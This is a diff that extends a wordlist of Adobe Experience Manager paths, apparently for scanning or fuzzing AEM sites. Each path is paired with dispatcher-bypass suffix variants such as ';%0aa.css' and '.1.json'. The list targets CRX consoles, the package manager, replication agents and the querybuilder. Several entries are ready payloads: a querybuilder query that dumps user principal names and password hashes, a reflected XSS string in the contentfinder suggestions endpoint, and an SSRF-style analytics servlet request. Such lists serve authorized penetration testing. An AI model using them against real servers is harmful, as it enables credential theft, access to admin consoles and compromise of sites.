@@ -15,6 +15,8 @@
 /..assetsearch.json/a.ico?query=*&start=0&limit=10&random=123
 /..assetsearch.json;%0aa.css?query=*&start=0&limit=10&random=123
 /..assetsearch.json?.css?query=*&start=0&limit=10&random=123
+/..assetsearch.json?query=*&start=0&limit=10&random=123
+/.1.json
 /.1.json.1.css
 /.1.json.1.json
 /.1.json.1.xml
@@ -32,6 +34,7 @@
 /.1.json/a.ico
 /.1.json;%0aa.css
 /.1.json?.css
+/.1.xml
 /.1.xml.1.css
 /.1.xml.1.json
 /.1.xml.1.xml
@@ -49,6 +52,7 @@
 /.1.xml/a.ico
 /.1.xml;%0aa.css
 /.1.xml?.css
+/.childrenlist.json
 /.childrenlist.json.1.css
 /.childrenlist.json.1.json
 /.childrenlist.json.1.xml
@@ -66,6 +70,7 @@
 /.childrenlist.json/a.ico
 /.childrenlist.json;%0aa.css
 /.childrenlist.json?.css
+/.ext.infinity.json
 /.ext.infinity.json.1.css
 /.ext.infinity.json.1.json
 /.ext.infinity.json.1.xml
@@ -83,6 +88,7 @@
 /.ext.infinity.json/a.ico
 /.ext.infinity.json;%0aa.css
 /.ext.infinity.json?.css
+/.ext.infinity.json?tidy=true
 /.ext.infinity.json?tidy=true.1.css
 /.ext.infinity.json?tidy=true.1.json
 /.ext.infinity.json?tidy=true.1.xml
@@ -100,6 +106,7 @@
 /.ext.infinity.json?tidy=true/a.ico
 /.ext.infinity.json?tidy=true;%0aa.css
 /.ext.infinity.json?tidy=true?.css
+/.ext.json
 /.ext.json.1.css
 /.ext.json.1.json
 /.ext.json.1.xml
@@ -117,6 +124,7 @@
 /.ext.json/a.ico
 /.ext.json;%0aa.css
 /.ext.json?.css
+/.feed.xml
 /.feed.xml.1.css
 /.feed.xml.1.json
 /.feed.xml.1.xml
@@ -134,6 +142,7 @@
 /.feed.xml/a.ico
 /.feed.xml;%0aa.css
 /.feed.xml?.css
+/.infinity.json
 /.infinity.json.1.css
 /.infinity.json.1.json
 /.infinity.json.1.xml
@@ -151,6 +160,7 @@
 /.infinity.json/a.ico
 /.infinity.json;%0aa.css
 /.infinity.json?.css
+/.json
 /.json.1.css
 /.json.1.json
 /.json.1.xml
@@ -168,6 +178,7 @@
 /.json/a.ico
 /.json;%0aa.css
 /.json?.css
+/.tidy.6.json
 /.tidy.6.json.1.css
 /.tidy.6.json.1.json
 /.tidy.6.json.1.xml
@@ -185,6 +196,7 @@
 /.tidy.6.json/a.ico
 /.tidy.6.json;%0aa.css
 /.tidy.6.json?.css
+/.tidy.infinity.json
 /.tidy.infinity.json.1.css
 /.tidy.infinity.json.1.json
 /.tidy.infinity.json.1.xml
@@ -202,6 +214,7 @@
 /.tidy.infinity.json/a.ico
 /.tidy.infinity.json;%0aa.css
 /.tidy.infinity.json?.css
+/.xml
 /.xml.1.css
 /.xml.1.json
 /.xml.1.xml
@@ -219,6 +232,7 @@
 /.xml/a.ico
 /.xml;%0aa.css
 /.xml?.css
+////system///sling/loginstatus.json
 ////system///sling/loginstatus.json.1.css
 ////system///sling/loginstatus.json.1.json
 ////system///sling/loginstatus.json.1.xml
@@ -236,6 +250,7 @@
 ////system///sling/loginstatus.json/a.ico
 ////system///sling/loginstatus.json;%0aa.css
 ////system///sling/loginstatus.json?.css
+///bin///querybuilder.feed.servlet
 ///bin///querybuilder.feed.servlet.1.css
 ///bin///querybuilder.feed.servlet.1.json
 ///bin///querybuilder.feed.servlet.1.xml
@@ -253,6 +268,7 @@
 ///bin///querybuilder.feed.servlet/a.ico
 ///bin///querybuilder.feed.servlet;%0aa.css
 ///bin///querybuilder.feed.servlet?.css
+///bin///querybuilder.json
 ///bin///querybuilder.json.1.css
 ///bin///querybuilder.json.1.json
 ///bin///querybuilder.json.1.xml
@@ -270,6 +286,7 @@
 ///bin///querybuilder.json/a.ico
 ///bin///querybuilder.json;%0aa.css
 ///bin///querybuilder.json?.css
+///bin///wcm/search/gql.json
 ///bin///wcm/search/gql.json.1.css
 ///bin///wcm/search/gql.json.1.json
 ///bin///wcm/search/gql.json.1.xml
@@ -287,6 +304,7 @@
 ///bin///wcm/search/gql.json/a.ico
 ///bin///wcm/search/gql.json;%0aa.css
 ///bin///wcm/search/gql.json?.css
+///bin///wcm/search/gql.servlet.json
 ///bin///wcm/search/gql.servlet.json.1.css
 ///bin///wcm/search/gql.servlet.json.1.json
 ///bin///wcm/search/gql.servlet.json.1.xml
@@ -304,6 +322,7 @@
 ///bin///wcm/search/gql.servlet.json/a.ico
 ///bin///wcm/search/gql.servlet.json;%0aa.css
 ///bin///wcm/search/gql.servlet.json?.css
+///system///sling/loginstatus
 ///system///sling/loginstatus.1.css
 ///system///sling/loginstatus.1.json
 ///system///sling/loginstatus.1.xml
@@ -321,6 +340,7 @@
 ///system///sling/loginstatus/a.ico
 ///system///sling/loginstatus;%0aa.css
 ///system///sling/loginstatus?.css
+/ReaderExtensions
 /ReaderExtensions.1.css
 /ReaderExtensions.1.json
 /ReaderExtensions.1.xml
@@ -338,6 +358,7 @@
 /ReaderExtensions/a.ico
 /ReaderExtensions;%0aa.css
 /ReaderExtensions?.css
+/adminui
 /adminui.1.css
 /adminui.1.json
 /adminui.1.xml
@@ -355,6 +376,7 @@
 /adminui/a.ico
 /adminui;%0aa.css
 /adminui?.css
+/apps.1.json
 /apps.1.json.1.css
 /apps.1.json.1.json
 /apps.1.json.1.xml
@@ -372,6 +394,7 @@
 /apps.1.json/a.ico
 /apps.1.json;%0aa.css
 /apps.1.json?.css
+/apps.feed.xml
 /apps.feed.xml.1.css
 /apps.feed.xml.1.json
 /apps.feed.xml.1.xml
@@ -389,6 +412,7 @@
 /apps.feed.xml/a.ico
 /apps.feed.xml;%0aa.css
 /apps.feed.xml?.css
+/apps.json
 /apps.json.1.css
 /apps.json.1.json
 /apps.json.1.xml
@@ -406,6 +430,7 @@
 /apps.json/a.ico
 /apps.json;%0aa.css
 /apps.json?.css
+/apps.tidy.infinity.json
 /apps.tidy.infinity.json.1.css
 /apps.tidy.infinity.json.1.json
 /apps.tidy.infinity.json.1.xml
@@ -423,9 +448,11 @@
 /apps.tidy.infinity.json/a.ico
 /apps.tidy.infinity.json;%0aa.css
 /apps.tidy.infinity.json?.css
+/bin
 /bin.1.css
 /bin.1.json
 /bin.1.xml
+/bin.childrenlist.json
 /bin.childrenlist.json.1.css
 /bin.childrenlist.json.1.json
 /bin.childrenlist.json.1.xml
@@ -444,6 +471,7 @@
 /bin.childrenlist.json;%0aa.css
 /bin.childrenlist.json?.css
 /bin.css
+/bin.ext.json
 /bin.ext.json.1.css
 /bin.ext.json.1.json
 /bin.ext.json.1.xml
@@ -461,6 +489,7 @@
 /bin.ext.json/a.ico
 /bin.ext.json;%0aa.css
 /bin.ext.json?.css
+/bin.feed.xml
 /bin.feed.xml.1.css
 /bin.feed.xml.1.json
 /bin.feed.xml.1.xml
@@ -480,6 +509,7 @@
 /bin.feed.xml?.css
 /bin.html
 /bin.ico
+/bin.infinity.json
 /bin.infinity.json.1.css
 /bin.infinity.json.1.json
 /bin.infinity.json.1.xml
@@ -499,6 +529,7 @@
 /bin.infinity.json?.css
 /bin.json
 /bin.png
+/bin.tidy.infinity.json
 /bin.tidy.infinity.json.1.css
 /bin.tidy.infinity.json.1.json
 /bin.tidy.infinity.json.1.xml
@@ -523,6 +554,7 @@
 /bin/a.gif
 /bin/a.html
 /bin/a.ico
+/bin/querybuilder.json
 /bin/querybuilder.json.1.css
 /bin/querybuilder.json.1.json
 /bin/querybuilder.json.1.xml
@@ -540,6 +572,7 @@
 /bin/querybuilder.json/a.ico
 /bin/querybuilder.json;%0aa.css
 /bin/querybuilder.json?.css
+/bin/querybuilder.json?type=nt:base&p.limit=-1
 /bin/querybuilder.json?type=nt:base&p.limit=-1.1.css
 /bin/querybuilder.json?type=nt:base&p.limit=-1.1.json
 /bin/querybuilder.json?type=nt:base&p.limit=-1.1.xml
@@ -557,6 +590,7 @@
 /bin/querybuilder.json?type=nt:base&p.limit=-1/a.ico
 /bin/querybuilder.json?type=nt:base&p.limit=-1;%0aa.css
 /bin/querybuilder.json?type=nt:base&p.limit=-1?.css
+/bin/querybuilder.json?type=rep:User&p.hits=selective&p.properties=rep:principalName%20rep:password&p.limit=100
 /bin/querybuilder.json?type=rep:User&p.hits=selective&p.properties=rep:principalName%20rep:password&p.limit=100.1.css
 /bin/querybuilder.json?type=rep:User&p.hits=selective&p.properties=rep:principalName%20rep:password&p.limit=100.1.json
 /bin/querybuilder.json?type=rep:User&p.hits=selective&p.properties=rep:principalName%20rep:password&p.limit=100.1.xml
@@ -574,6 +608,7 @@
 /bin/querybuilder.json?type=rep:User&p.hits=selective&p.properties=rep:principalName%20rep:password&p.limit=100/a.ico
 /bin/querybuilder.json?type=rep:User&p.hits=selective&p.properties=rep:principalName%20rep:password&p.limit=100;%0aa.css
 /bin/querybuilder.json?type=rep:User&p.hits=selective&p.properties=rep:principalName%20rep:password&p.limit=100?.css
+/bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=%3Csvg+onload%3dalert(document.domain)%3E&post=yyyy
 /bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=%3Csvg+onload%3dalert(document.domain)%3E&post=yyyy.1.css
 /bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=%3Csvg+onload%3dalert(document.domain)%3E&post=yyyy.1.json
 /bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=%3Csvg+onload%3dalert(document.domain)%3E&post=yyyy.1.xml
@@ -591,6 +626,7 @@
 /bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=%3Csvg+onload%3dalert(document.domain)%3E&post=yyyy/a.ico
 /bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=%3Csvg+onload%3dalert(document.domain)%3E&post=yyyy;%0aa.css
 /bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=%3Csvg+onload%3dalert(document.domain)%3E&post=yyyy?.css
+/bin/wcm/search/gql.servlet.json?query=type:base%20limit:..-1&pathPrefix=
 /bin/wcm/search/gql.servlet.json?query=type:base%20limit:..-1&pathPrefix=.1.css
 /bin/wcm/search/gql.servlet.json?query=type:base%20limit:..-1&pathPrefix=.1.json
 /bin/wcm/search/gql.servlet.json?query=type:base%20limit:..-1&pathPrefix=.1.xml
@@ -610,6 +646,7 @@
 /bin/wcm/search/gql.servlet.json?query=type:base%20limit:..-1&pathPrefix=?.css
 /bin;%0aa.css
 /bin?.css
+/composer.json
 /composer.json.1.css
 /composer.json.1.json
 /composer.json.1.xml
@@ -627,9 +664,11 @@
 /composer.json/a.ico
 /composer.json;%0aa.css
 /composer.json?.css
+/content
 /content.1.css
 /content.1.json
 /content.1.xml
+/content.assetsearch.json?query=*&start=0&limit=10&random=123
 /content.assetsearch.json?query=*&start=0&limit=10&random=123.1.css
 /content.assetsearch.json?query=*&start=0&limit=10&random=123.1.json
 /content.assetsearch.json?query=*&start=0&limit=10&random=123.1.xml
@@ -647,6 +686,7 @@
 /content.assetsearch.json?query=*&start=0&limit=10&random=123/a.ico
 /content.assetsearch.json?query=*&start=0&limit=10&random=123;%0aa.css
 /content.assetsearch.json?query=*&start=0&limit=10&random=123?.css
+/content.childrenlist.json
 /content.childrenlist.json.1.css
 /content.childrenlist.json.1.json
 /content.childrenlist.json.1.xml
@@ -665,6 +705,7 @@
 /content.childrenlist.json;%0aa.css
 /content.childrenlist.json?.css
 /content.css
+/content.ext.infinity.1..json?tidy=true
 /content.ext.infinity.1..json?tidy=true.1.css
 /content.ext.infinity.1..json?tidy=true.1.json
 /content.ext.infinity.1..json?tidy=true.1.xml
@@ -682,6 +723,7 @@
 /content.ext.infinity.1..json?tidy=true/a.ico
 /content.ext.infinity.1..json?tidy=true;%0aa.css
 /content.ext.infinity.1..json?tidy=true?.css
+/content.ext.json
 /content.ext.json.1.css
 /content.ext.json.1.json
 /content.ext.json.1.xml
@@ -699,6 +741,7 @@
 /content.ext.json/a.ico
 /content.ext.json;%0aa.css
 /content.ext.json?.css
+/content.feed.xml
 /content.feed.xml.1.css
 /content.feed.xml.1.json
 /content.feed.xml.1.xml
@@ -718,6 +761,7 @@
 /content.feed.xml?.css
 /content.html
 /content.ico
+/content.infinity.json
 /content.infinity.json.1.css
 /content.infinity.json.1.json
 /content.infinity.json.1.xml
@@ -744,6 +788,8 @@
 /content/a.gif
 /content/a.html
 /content/a.ico
+/content/geometrixx
+/content/geometrixx-outdoors/en.html
 /content/geometrixx-outdoors/en.html.1.css
 /content/geometrixx-outdoors/en.html.1.json
 /content/geometrixx-outdoors/en.html.1.xml
@@ -778,6 +824,7 @@
 /content/geometrixx/a.ico
 /content/geometrixx;%0aa.css
 /content/geometrixx?.css
+/content/usergenerated/etc/commerce/smartlists
 /content/usergenerated/etc/commerce/smartlists.1.css
 /content/usergenerated/etc/commerce/smartlists.1.json
 /content/usergenerated/etc/commerce/smartlists.1.xml
@@ -797,6 +844,7 @@
 /content/usergenerated/etc/commerce/smartlists?.css
 /content;%0aa.css
 /content?.css
+/crx/de
 /crx/de.1.css
 /crx/de.1.json
 /crx/de.1.xml
@@ -812,6 +860,7 @@
 /crx/de/a.gif
 /crx/de/a.html
 /crx/de/a.ico
+/crx/de/index.jsp
 /crx/de/index.jsp.1.css
 /crx/de/index.jsp.1.json
 /crx/de/index.jsp.1.xml
@@ -831,6 +880,7 @@
 /crx/de/index.jsp?.css
 /crx/de;%0aa.css
 /crx/de?.css
+/crx/explorer/browser/index.jsp
 /crx/explorer/browser/index.jsp.1.css
 /crx/explorer/browser/index.jsp.1.json
 /crx/explorer/browser/index.jsp.1.xml
@@ -848,6 +898,7 @@
 /crx/explorer/browser/index.jsp/a.ico
 /crx/explorer/browser/index.jsp;%0aa.css
 /crx/explorer/browser/index.jsp?.css
+/crx/explorer/index.jsp
 /crx/explorer/index.jsp.1.css
 /crx/explorer/index.jsp.1.json
 /crx/explorer/index.jsp.1.xml
@@ -865,6 +916,7 @@
 /crx/explorer/index.jsp/a.ico
 /crx/explorer/index.jsp;%0aa.css
 /crx/explorer/index.jsp?.css
+/crx/explorer/nodetypes/index.jsp
 /crx/explorer/nodetypes/index.jsp.1.css
 /crx/explorer/nodetypes/index.jsp.1.json
 /crx/explorer/nodetypes/index.jsp.1.xml
@@ -882,6 +934,8 @@
 /crx/explorer/nodetypes/index.jsp/a.ico
 /crx/explorer/nodetypes/index.jsp;%0aa.css
 /crx/explorer/nodetypes/index.jsp?.css
+/crx/explorer/ui/namespace_editor.jsp
+/crx/explorer/ui/search.jsp?Path=&Query=
 /crx/explorer/ui/search.jsp?Path=&Query=.1.css
 /crx/explorer/ui/search.jsp?Path=&Query=.1.json
 /crx/explorer/ui/search.jsp?Path=&Query=.1.xml
@@ -899,6 +953,7 @@
 /crx/explorer/ui/search.jsp?Path=&Query=/a.ico
 /crx/explorer/ui/search.jsp?Path=&Query=;%0aa.css
 /crx/explorer/ui/search.jsp?Path=&Query=?.css
+/crx/packageshare
 /crx/packageshare.1.css
 /crx/packageshare.1.json
 /crx/packageshare.1.xml
@@ -916,6 +971,7 @@
 /crx/packageshare/a.ico
 /crx/packageshare;%0aa.css
 /crx/packageshare?.css
+/crx/packmgr/index.jsp
 /crx/packmgr/index.jsp.1.css
 /crx/packmgr/index.jsp.1.json
 /crx/packmgr/index.jsp.1.xml
@@ -933,6 +989,7 @@
 /crx/packmgr/index.jsp/a.ico
 /crx/packmgr/index.jsp;%0aa.css
 /crx/packmgr/index.jsp?.css
+/crx/repository/test
 /crx/repository/test.1.css
 /crx/repository/test.1.json
 /crx/repository/test.1.xml
@@ -950,6 +1007,8 @@
 /crx/repository/test/a.ico
 /crx/repository/test;%0aa.css
 /crx/repository/test?.css
+/damadmin
+/damadmin#/content/dam
 /damadmin#/content/dam.1.css
 /damadmin#/content/dam.1.json
 /damadmin#/content/dam.1.xml
@@ -984,9 +1043,11 @@
 /damadmin/a.ico
 /damadmin;%0aa.css
 /damadmin?.css
+/etc
 /etc.1.css
 /etc.1.json
 /etc.1.xml
+/etc.childrenlist.json
 /etc.childrenlist.json.1.css
 /etc.childrenlist.json.1.json
 /etc.childrenlist.json.1.xml
@@ -1005,6 +1066,7 @@
 /etc.childrenlist.json;%0aa.css
 /etc.childrenlist.json?.css
 /etc.css
+/etc.feed.xml
 /etc.feed.xml.1.css
 /etc.feed.xml.1.json
 /etc.feed.xml.1.xml
@@ -1024,6 +1086,7 @@
 /etc.feed.xml?.css
 /etc.html
 /etc.ico
+/etc.infinity.json
 /etc.infinity.json.1.css
 /etc.infinity.json.1.json
 /etc.infinity.json.1.xml
@@ -1050,6 +1113,7 @@
 /etc/a.gif
 /etc/a.html
 /etc/a.ico
+/etc/clientcontext/default/content.html
 /etc/clientcontext/default/content.html.1.css
 /etc/clientcontext/default/content.html.1.json
 /etc/clientcontext/default/content.html.1.xml
@@ -1067,6 +1131,7 @@
 /etc/clientcontext/default/content.html/a.ico
 /etc/clientcontext/default/content.html;%0aa.css
 /etc/clientcontext/default/content.html?.css
+/etc/cloudservices.html
 /etc/cloudservices.html.1.css
 /etc/cloudservices.html.1.json
 /etc/cloudservices.html.1.xml
@@ -1084,6 +1149,7 @@
 /etc/cloudservices.html/a.ico
 /etc/cloudservices.html;%0aa.css
 /etc/cloudservices.html?.css
+/etc/cloudsettings.-1.json
 /etc/cloudsettings.-1.json.1.css
 /etc/cloudsettings.-1.json.1.json
 /etc/cloudsettings.-1.json.1.xml
@@ -1101,6 +1167,7 @@
 /etc/cloudsettings.-1.json/a.ico
 /etc/cloudsettings.-1.json;%0aa.css
 /etc/cloudsettings.-1.json?.css
+/etc/mobile/useragent-test.html
 /etc/mobile/useragent-test.html.1.css
 /etc/mobile/useragent-test.html.1.json
 /etc/mobile/useragent-test.html.1.xml
@@ -1118,6 +1185,7 @@
 /etc/mobile/useragent-test.html/a.ico
 /etc/mobile/useragent-test.html;%0aa.css
 /etc/mobile/useragent-test.html?.css
+/etc/packages
 /etc/packages.1.css
 /etc/packages.1.json
 /etc/packages.1.xml
@@ -1135,6 +1203,7 @@
 /etc/packages/a.ico
 /etc/packages;%0aa.css
 /etc/packages?.css
+/etc/replication.html
 /etc/replication.html.1.css
 /etc/replication.html.1.json
 /etc/replication.html.1.xml
@@ -1152,6 +1221,7 @@
 /etc/replication.html/a.ico
 /etc/replication.html;%0aa.css
 /etc/replication.html?.css
+/etc/replication/agents.author.html
 /etc/replication/agents.author.html.1.css
 /etc/replication/agents.author.html.1.json
 /etc/replication/agents.author.html.1.xml
@@ -1169,6 +1239,7 @@
 /etc/replication/agents.author.html/a.ico
 /etc/replication/agents.author.html;%0aa.css
 /etc/replication/agents.author.html?.css
+/etc/replication/agents.publish.html
 /etc/replication/agents.publish.html.1.css
 /etc/replication/agents.publish.html.1.json
 /etc/replication/agents.publish.html.1.xml
@@ -1186,6 +1257,7 @@
 /etc/replication/agents.publish.html/a.ico
 /etc/replication/agents.publish.html;%0aa.css
 /etc/replication/agents.publish.html?.css
+/etc/replication/agents.publish/flush.html
 /etc/replication/agents.publish/flush.html.1.css
 /etc/replication/agents.publish/flush.html.1.json
 /etc/replication/agents.publish/flush.html.1.xml
@@ -1203,6 +1275,7 @@
 /etc/replication/agents.publish/flush.html/a.ico
 /etc/replication/agents.publish/flush.html;%0aa.css
 /etc/replication/agents.publish/flush.html?.css
+/etc/replication/treeactivation.html
 /etc/replication/treeactivation.html.1.css
 /etc/replication/treeactivation.html.1.json
 /etc/replication/treeactivation.html.1.xml
@@ -1220,6 +1293,7 @@
 /etc/replication/treeactivation.html/a.ico
 /etc/replication/treeactivation.html;%0aa.css
 /etc/replication/treeactivation.html?.css
+/etc/reports/auditreport.html
 /etc/reports/auditreport.html.1.css
 /etc/reports/auditreport.html.1.json
 /etc/reports/auditreport.html.1.xml
@@ -1237,6 +1311,7 @@
 /etc/reports/auditreport.html/a.ico
 /etc/reports/auditreport.html;%0aa.css
 /etc/reports/auditreport.html?.css
+/etc/reports/diskusage.html
 /etc/reports/diskusage.html.1.css
 /etc/reports/diskusage.html.1.json
 /etc/reports/diskusage.html.1.xml
@@ -1254,6 +1329,7 @@
 /etc/reports/diskusage.html/a.ico
 /etc/reports/diskusage.html;%0aa.css
 /etc/reports/diskusage.html?.css
+/etc/reports/diskusage.html?path=/content/dam
 /etc/reports/diskusage.html?path=/content/dam.1.css
 /etc/reports/diskusage.html?path=/content/dam.1.json
 /etc/reports/diskusage.html?path=/content/dam.1.xml
@@ -1271,6 +1347,7 @@
 /etc/reports/diskusage.html?path=/content/dam/a.ico
 /etc/reports/diskusage.html?path=/content/dam;%0aa.css
 /etc/reports/diskusage.html?path=/content/dam?.css
+/etc/reports/userreport.html
 /etc/reports/userreport.html.1.css
 /etc/reports/userreport.html.1.json
 /etc/reports/userreport.html.1.xml
@@ -1290,10 +1367,12 @@
 /etc/reports/userreport.html?.css
 /etc;%0aa.css
 /etc?.css
+/home
 /home.1.css
 /home.1.json
 /home.1.xml
 /home.css
+/home.feed
 /home.feed.1.css
 /home.feed.1.json
 /home.feed.1.xml
@@ -1313,6 +1392,7 @@
 /home.feed?.css
 /home.html
 /home.ico
+/home.infinity.json
 /home.infinity.json.1.css
 /home.infinity.json.1.json
 /home.infinity.json.1.xml
@@ -1341,6 +1421,7 @@
 /home/a.ico
 /home;%0aa.css
 /home?.css
+/jcr:content.json
 /jcr:content.json.1.css
 /jcr:content.json.1.json
 /jcr:content.json.1.xml
@@ -1358,6 +1439,7 @@
 /jcr:content.json/a.ico
 /jcr:content.json;%0aa.css
 /jcr:content.json?.css
+/lc/cm/
 /lc/cm/.1.css
 /lc/cm/.1.json
 /lc/cm/.1.xml
@@ -1375,6 +1457,7 @@
 /lc/cm//a.ico
 /lc/cm/;%0aa.css
 /lc/cm/?.css
+/lc/content/ws
 /lc/content/ws.1.css
 /lc/content/ws.1.json
 /lc/content/ws.1.xml
@@ -1392,6 +1475,7 @@
 /lc/content/ws/a.ico
 /lc/content/ws;%0aa.css
 /lc/content/ws?.css
+/lc/crx/packmgr/index.jsp
 /lc/crx/packmgr/index.jsp.1.css
 /lc/crx/packmgr/index.jsp.1.json
 /lc/crx/packmgr/index.jsp.1.xml
@@ -1409,6 +1493,7 @@
 /lc/crx/packmgr/index.jsp/a.ico
 /lc/crx/packmgr/index.jsp;%0aa.css
 /lc/crx/packmgr/index.jsp?.css
+/lc/system/console
 /lc/system/console.1.css
 /lc/system/console.1.json
 /lc/system/console.1.xml
@@ -1426,10 +1511,12 @@
 /lc/system/console/a.ico
 /lc/system/console;%0aa.css
 /lc/system/console?.css
+/libs
 /libs.1.css
 /libs.1.json
 /libs.1.xml
 /libs.css
+/libs.feed.xml
 /libs.feed.xml.1.css
 /libs.feed.xml.1.json
 /libs.feed.xml.1.xml
@@ -1449,6 +1536,7 @@
 /libs.feed.xml?.css
 /libs.html
 /libs.ico
+/libs.infinity.json
 /libs.infinity.json.1.css
 /libs.infinity.json.1.json
 /libs.infinity.json.1.xml
@@ -1475,6 +1563,7 @@
 /libs/a.gif
 /libs/a.html
 /libs/a.ico
+/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.1.css
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.1.json
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.1.xml
@@ -1492,6 +1581,7 @@
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet/a.ico
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet;%0aa.css
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?.css
+/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter=https://site%23&company=xxx&username=zzz&secret=yyyy
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter=https://site%23&company=xxx&username=zzz&secret=yyyy.1.css
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter=https://site%23&company=xxx&username=zzz&secret=yyyy.1.json
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter=https://site%23&company=xxx&username=zzz&secret=yyyy.1.xml
@@ -1509,6 +1599,7 @@
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter=https://site%23&company=xxx&username=zzz&secret=yyyy/a.ico
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter=https://site%23&company=xxx&username=zzz&secret=yyyy;%0aa.css
 /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter=https://site%23&company=xxx&username=zzz&secret=yyyy?.css
+/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json
 /libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json.1.css
 /libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json.1.json
 /libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json.1.xml
@@ -1526,6 +1617,7 @@
 /libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/a.ico
 /libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json;%0aa.css
 /libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json?.css
+/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json
 /libs/cq/cloudservicesprovisioning/content/autoprovisioning.json.1.css
 /libs/cq/cloudservicesprovisioning/content/autoprovisioning.json.1.json
 /libs/cq/cloudservicesprovisioning/content/autoprovisioning.json.1.xml
@@ -1543,6 +1635,7 @@
 /libs/cq/cloudservicesprovisioning/content/autoprovisioning.json/a.ico
 /libs/cq/cloudservicesprovisioning/content/autoprovisioning.json;%0aa.css
 /libs/cq/cloudservicesprovisioning/content/autoprovisioning.json?.css
+/libs/cq/contentinsight/content/proxy.reportingservices.json
 /libs/cq/contentinsight/content/proxy.reportingservices.json.1.css
 /libs/cq/contentinsight/content/proxy.reportingservices.json.1.json
 /libs/cq/contentinsight/content/proxy.reportingservices.json.1.xml
@@ -1560,6 +1653,7 @@
 /libs/cq/contentinsight/content/proxy.reportingservices.json/a.ico
 /libs/cq/contentinsight/content/proxy.reportingservices.json;%0aa.css
 /libs/cq/contentinsight/content/proxy.reportingservices.json?.css
+/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet
 /libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.1.css
 /libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.1.json
 /libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.1.xml
@@ -1577,6 +1671,7 @@
 /libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet/a.ico
 /libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0aa.css
 /libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?.css
+/libs/cq/core/content/login.html
 /libs/cq/core/content/login.html.1.css
 /libs/cq/core/content/login.html.1.json
 /libs/cq/core/content/login.html.1.xml
@@ -1594,6 +1689,7 @@
 /libs/cq/core/content/login.html/a.ico
 /libs/cq/core/content/login.html;%0aa.css
 /libs/cq/core/content/login.html?.css
+/libs/cq/core/content/welcome.html
 /libs/cq/core/content/welcome.html.1.css
 /libs/cq/core/content/welcome.html.1.json
 /libs/cq/core/content/welcome.html.1.xml
@@ -1611,6 +1707,7 @@
 /libs/cq/core/content/welcome.html/a.ico
 /libs/cq/core/content/welcome.html;%0aa.css
 /libs/cq/core/content/welcome.html?.css
+/libs/cq/i18n/translator.html
 /libs/cq/i18n/translator.html.1.css
 /libs/cq/i18n/translator.html.1.json
 /libs/cq/i18n/translator.html.1.xml
@@ -1628,6 +1725,7 @@
 /libs/cq/i18n/translator.html/a.ico
 /libs/cq/i18n/translator.html;%0aa.css
 /libs/cq/i18n/translator.html?.css
+/libs/cq/search/content/querydebug.html
 /libs/cq/search/content/querydebug.html.1.css
 /libs/cq/search/content/querydebug.html.1.json
 /libs/cq/search/content/querydebug.html.1.xml
@@ -1645,6 +1743,7 @@
 /libs/cq/search/content/querydebug.html/a.ico
 /libs/cq/search/content/querydebug.html;%0aa.css
 /libs/cq/search/content/querydebug.html?.css
+/libs/cq/tagging/content/tagadmin.html
 /libs/cq/tagging/content/tagadmin.html.1.css
 /libs/cq/tagging/content/tagadmin.html.1.json
 /libs/cq/tagging/content/tagadmin.html.1.xml
@@ -1662,6 +1761,7 @@
 /libs/cq/tagging/content/tagadmin.html/a.ico
 /libs/cq/tagging/content/tagadmin.html;%0aa.css
 /libs/cq/tagging/content/tagadmin.html?.css
+/libs/cq/ui/content/dumplibs.html
 /libs/cq/ui/content/dumplibs.html.1.css
 /libs/cq/ui/content/dumplibs.html.1.json
 /libs/cq/ui/content/dumplibs.html.1.xml
@@ -1679,6 +1779,7 @@
 /libs/cq/ui/content/dumplibs.html/a.ico
 /libs/cq/ui/content/dumplibs.html;%0aa.css
 /libs/cq/ui/content/dumplibs.html?.css
+/libs/cq/workflow/content/console.html
 /libs/cq/workflow/content/console.html.1.css
 /libs/cq/workflow/content/console.html.1.json
 /libs/cq/workflow/content/console.html.1.xml
@@ -1696,6 +1797,7 @@
 /libs/cq/workflow/content/console.html/a.ico
 /libs/cq/workflow/content/console.html;%0aa.css
 /libs/cq/workflow/content/console.html?.css
+/libs/cq/workflow/content/inbox.html
 /libs/cq/workflow/content/inbox.html.1.css
 /libs/cq/workflow/content/inbox.html.1.json
 /libs/cq/workflow/content/inbox.html.1.xml
@@ -1713,6 +1815,7 @@
 /libs/cq/workflow/content/inbox.html/a.ico
 /libs/cq/workflow/content/inbox.html;%0aa.css
 /libs/cq/workflow/content/inbox.html?.css
+/libs/dam/cloud/proxy.json
 /libs/dam/cloud/proxy.json.1.css
 /libs/dam/cloud/proxy.json.1.json
